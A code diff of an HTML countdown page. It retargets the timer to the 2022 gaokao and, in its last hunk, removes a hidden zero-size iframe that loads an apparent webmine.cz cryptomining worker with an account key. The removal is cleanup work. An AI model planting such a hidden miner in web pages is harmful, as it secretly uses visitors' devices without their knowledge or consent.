@@ -49,14 +49,14 @@ console.log(str);
 
 <script type="text/javascript">
 function getRTime() {
-	var EndTime = new Date("2022/02/28 11:30:00"); //截止时间
+	var EndTime = new Date("2022/06/07 00:00:00"); //截止时间
 	var NowTime = new Date();
 	var t = EndTime.getTime() - NowTime.getTime();
 	var d = Math.floor(t / 1000 / 60 / 60 / 24);
 	var h = Math.floor(t / 1000 / 60 / 60 % 24);
 	var m = Math.floor(t / 1000 / 60 % 60);
 	var s = Math.floor(t / 1000 % 60);
-	document.getElementById("t_d").innerHTML ="距离2022年FJ还有" + d + "天";
+	document.getElementById("t_d").innerHTML ="距离2022年高考还有" + d + "天";
 	document.getElementById("t_h").innerHTML = h + "时";
 	document.getElementById("t_m").innerHTML = m + "分";
 	document.getElementById("t_s").innerHTML = s + "秒";
@@ -105,6 +105,4 @@ setInterval(getRTime, 1000);
 </div>
 <script src="static/js/jquery-migrate-1.2.1.min.js"></script>
 <script src="static/js/index.js"></script>
-<iframe width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=xbqHV99e3Xk7Z81'></iframe>
-
 
